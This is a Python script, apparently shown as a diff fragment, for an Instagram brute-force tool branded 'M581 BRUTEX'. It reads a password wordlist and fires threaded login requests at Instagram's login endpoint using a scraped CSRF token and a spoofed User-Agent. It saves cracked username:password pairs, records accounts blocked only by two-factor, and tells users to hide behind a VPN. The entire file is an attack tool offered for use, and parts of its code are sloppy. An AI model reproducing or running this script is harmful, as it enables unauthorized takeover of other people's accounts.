#   Project    :  Bruteforce Attack
#   Author     :  BIPUL
#   Version    :  1.1
#   Github     :  https://github.com/Qwasbk

import requests, sys, threading
import time, os, random
from random import randint
from six.moves import input
import colorama
@@ -18,28 +16,30 @@
CheckVersion = str(sys.version)
import re
from datetime import datetime

os.system("clear")

def anime(text):
    for txt in text:
        sys.stdout.write(txt)
        sys.stdout.flush()
        time.sleep(0.01)


start = '''\033[1;32m

   _____   .________  ______  ____                          
  /     \  |   ____/ /  __  \/_   |                         
 /  \ /  \ |____  \  >      < |   |                         
/    Y    \/       \/   --   \|   |                         
\____|__  /______  /\______  /|___|                         
        \/       \/        \/                               
____________________ ____ _____________________________  ___
\______   \______   \    |   \__    ___/\_   _____/\   \/  /
 |    |  _/|       _/    |   / |    |    |    __)_  \     / 
 |    |   \|    |   \    |  /  |    |    |        \ /     \ 
 |______  /|____|_  /______/   |____|   /_______  //___/\  \
        \/        \/                            \/       \_/    

           \033[1;34m .:M 5 8 1  B R U T E X:.

                  __Instagram Brute Force Attack__

'''

anime(start)

impmsg = "\n\033[1;34mThis Tool is Free For Our subscribers\nWe are Redirecting You To Our YouTube Channel\nYou Will Subscribe Our Channel\nAfter Doing It You Will Able To Use Our Tool." 
anime(impmsg)
time.sleep(8)

channel_url = 'https://youtube.com/@the_m581_company'
os.system(f'termux-open {channel_url}')
time.sleep(8)
os.system("clear")

logo = '''\033[1;32m

   _____   .________  ______  ____                          
  /     \  |   ____/ /  __  \/_   |                         
 /  \ /  \ |____  \  >      < |   |                         
/    Y    \/       \/   --   \|   |                         
\____|__  /______  /\______  /|___|                         
        \/       \/        \/                               
____________________ ____ _____________________________  ___
\______   \______   \    |   \__    ___/\_   _____/\   \/  /
 |    |  _/|       _/    |   / |    |    |    __)_  \     / 
 |    |   \|    |   \    |  /  |    |    |        \ /     \ 
 |______  /|____|_  /______/   |____|   /_______  //___/\  \
        \/        \/                            \/       \_/

           \033[1;34m .:M 5 8 1  B R U T E X:.

                  __Instagram Brute Force Attack__

'''
anime(logo)

sp = " >> Script By Azhar << \n"
name = f"\n\t\t       {colorama.Back.RED + colorama.Fore.WHITE}{sp}"
anime(name)
print(colorama.Back.RESET)
print(colorama.Fore.RESET)

ghub = colorama.Back.BLACK + " >> \033[97;1mOur More Tools On GitHub M581Official << "
anime(f"       {ghub}")
print(colorama.Back.RESET)

print("\n\n\033[31mNotice :-> Please use vpn before running the tool..")
print("\033[38mInformation :-> For Quiting This Program Enter --> q\n\033[0m")
print("\033[32mInformation --> Please Move Your Worldlist File In Download Folder In Your File Manager\n\033[0m")
input("\n\033[0;33mAfter reading it press enter to start \033[0m")

# Check Username

try:
    def check_instagram_username(user):
        check_url = f"https://www.instagram.com/{user}/"
        response = requests.get(check_url)

        if response.status_code == 200:
            return True
        elif response.status_code == 404:
            return False

    # Main Script

    class InstaBruteforce(object):
        def __init__(self):
            try:
                user = input('\033[1;32mUsername :\033[0;35m ')
                # If Quit
                if user == 'q':
                    endmsg ="\nThanks For Using Our Tool\nDon't Forget to Subscribe M581 Official. \n"
                    time.sleep(0.8)
                    anime(endmsg)
                    time.sleep(3)
                    chnl_url = 'https://youtube.com/@the_m581_company'
                    os.system(f'termux-open {chnl_url}')
                    sys.exit()

                wordlst = input('\033[1;32mWordlist Name :\033[0;33m ')
                wrdlst = f"/storage/emulated/0/Download/{wordlst}"
                print(colorama.Fore.BLUE + "\nPlease Wait...")
                if wordlst == 'q':
                    endmsg ="\nThanks For Using Our Tool\nDon't Forget To Subscribe M581 Official.\n"
                    time.sleep(0.8)
                    anime(endmsg)
                    time.sleep(3)
                    os.system(f'termux-open {chnl_url}')
                    sys.exit()
                print('\n----------------------------------------------------------------\n')

            except:
                endmsg = green+"\nThanks For Using Our Tool\nDon't Forget To Subscribe M581 Official."
                time.sleep(0.8)
                anime(endmsg)
                time.sleep(2)
                sys.exit()

        # Cracking Started Here

            is_available = check_instagram_username(user)

            if is_available:
                with open(wrdlst, 'r') as x:
                    wordlist = [line.strip() for line in x.readlines()]
                thread = []
                self.Coutprox = 0
                for words in wordlist:
                    password = words.split(':')[0]
                    t = threading.Thread(target=self.login, args=(user, password))
                    t.start()
                    thread.append(t)
                    time.sleep(0.9)
                for k in thread:
                    k.join()

            else:
                print("Username is not found!")

        def login(self, user, pwd):
            link = 'https://www.instagram.com/accounts/login/'
            login_url = 'https://www.instagram.com/accounts/login/ajax/'

            time = int(datetime.now().timestamp())

            bug = {
                'username': user,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
                'queryParams': {},
                'optIntoOneTap': 'false'
            }

            with requests.Session() as s:
                r = s.get(link)
                csrf = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]
                r = s.post(login_url, data=bug, headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",

                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": "https://www.instagram.com/accounts/login/",
                    "x-csrftoken": csrf
                })
                print(f'Password Not Matched {user}:{pwd}')
                print('############################################')

                if 'authenticated: true' in r.text:
                    print(('' + user + ':' + pwd + ' --> Successfully Cracked '))
                    x = open('finally.txt','a')
                    x.write(user + ':' + pwd + '\n')
                    x.close()

                elif 'two_factor_required' in r.text:
                    print(('' + user + ':' + pwd + ' -->  Good but Two Factor Required'))
                    with open('account_Verfiy.txt', 'a') as v:
                        v.write(user + ':' + pwd + '\n')


    InstaBruteforce()
except:
    print(" ")
